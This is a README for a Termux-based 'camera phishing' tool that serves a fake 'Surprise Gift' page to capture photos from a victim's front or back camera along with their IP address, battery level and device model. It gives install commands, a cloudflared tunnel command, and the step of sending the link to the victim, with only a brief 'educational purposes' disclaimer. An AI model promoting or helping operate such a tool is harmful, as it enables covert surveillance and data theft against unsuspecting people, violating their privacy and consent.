# CYBER_SHR-Camphish-

# 📸 CYBER_SHR-Camphish- 

**CYBER_SHR-Camphish-** is a professional and high-quality camera phishing tool designed for educational purposes and security testing. It captures images from front, back, or dual cameras with additional device metadata.

---

## ✨ Features
* **Multi-Camera Support**: Front, Back, and Dual camera capturing modes.
* **High Quality**: Includes an 8-second focus delay to ensure clear image capture.
* **Deep Info Capture**: Automatically retrieves Victim's **IP Address**, **Battery Percentage**, and **Device Model** (e.g., Samsung, Vivo, Oppo).
* **Professional UI**: Clean "Surprise Gift" interface with smooth CSS animations.
* **Real-time Logs**: Displays victim data directly in the Termux terminal.

---

## 🚀 Installation

Follow these steps to set up the tool in Termux:

```bash
# Update and install dependencies
pkg update && pkg upgrade -y
pkg install python php git -y

# Clone the repository
git clone [https://github.com/Roshan0786shah/CYBER_SHR-Camphish-.git](https://github.com/Roshan0786shah/CYBER_SHR-Camphish-.git)

# Enter the directory
cd CYBER_SHR-Camphish-

# Run the tool
python shr-cam.py


🛠️ How to Use
1. Run the tool using python shr-cam.py
2. Select your desired camera mode (1, 2, or 3).
3. Open a new session in Termux and start a tunnel (e.g., using Cloudflared):

cloudflared tunnel --url [http://127.0.0.1:8080](http://127.0.0.1:8080)

4. Send the generated link to the victim.
5. Captured photos and logs will appear in your terminal and be saved in sites/camera/.

⚠️ Disclaimer
This tool is developed for educational purposes only. Unauthorized use of this tool against targets without prior mutual consent is illegal. The developer (Roshan Ali) is not responsible for any misuse or damage caused by this program.
Created by Roshan Ali Team: CYBER SHR
